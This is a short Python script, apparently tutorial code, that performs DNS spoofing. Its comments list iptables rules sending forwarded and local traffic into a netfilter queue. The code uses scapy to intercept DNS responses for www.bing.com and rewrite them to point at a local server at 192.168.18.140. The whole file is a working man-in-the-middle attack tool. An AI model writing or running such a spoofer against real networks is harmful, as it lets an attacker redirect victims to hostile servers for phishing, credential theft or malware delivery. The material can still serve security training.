#!/usr/bin/env python

# iptables -I FORWARD -j NFQUEUE --queue-num 0 # CREATE THE NFQUEUE TO TRACK PACKAGES RECEIVED FROM OTHER PCS
# iptables -I OUTPUT -j NFQUEUE --queue-num 0 # CREATE THE NFQUEUE TO TRACK PACKAGES YOU'RE SENDING OUT LOCALLY
# iptables -I INPUT -j NFQUEUE --queue-num 0 # CREATE THE NFQUEUE TO TRACK PACKAGES YOU'RE RECEIVING LOCALLY
# iptables --flush # FLUSH THE IPTABLE WHEN YOU'RE DONE

# Your local server is stored under ~/var/www/html
# You can run it with service apache2 start

import netfilterqueue
import scapy.all as scapy

# Simply run scapy.show() and analyze the packet, extract the useful stuff, alter it and set payload

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR): # DNS Resource Record, aka response
        qname = scapy_packet[scapy.DNSQR].qname # DNS Query Record, aka question
        if "www.bing.com" in qname: # Or set any other website
            print("[+] Spoofing target")
            answer = scapy.DNSRR (rrname = qname, rdata = "192.168.18.140")
            # rrname = Resource Record Name, aka domain name / rdata = Resource Data (is the value of the IP address)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount =  1

            # Just delete them, scapy will auto-fill them before sending.
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

